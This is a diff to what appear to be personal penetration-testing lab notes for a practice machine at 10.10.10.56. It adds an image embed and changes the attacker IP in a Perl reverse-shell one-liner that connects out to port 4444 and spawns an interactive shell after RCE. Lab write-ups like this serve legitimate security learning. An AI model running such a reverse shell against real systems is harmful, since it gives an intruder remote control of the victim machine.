@@ -1,3 +1,5 @@
+![[Pasted image 20240720111036.png]]
+
 **Ping**
 ```
 ping 10.10.10.56
@@ -71,7 +73,7 @@ We got RCE, will get reverse shell now
 
 Reverse shell using Perl
 ```
-perl -e 'use Socket;$i="10.10.14.7";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+perl -e 'use Socket;$i="10.10.14.2";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
 ```
 ![[Pasted image 20240611164620.png]]
 
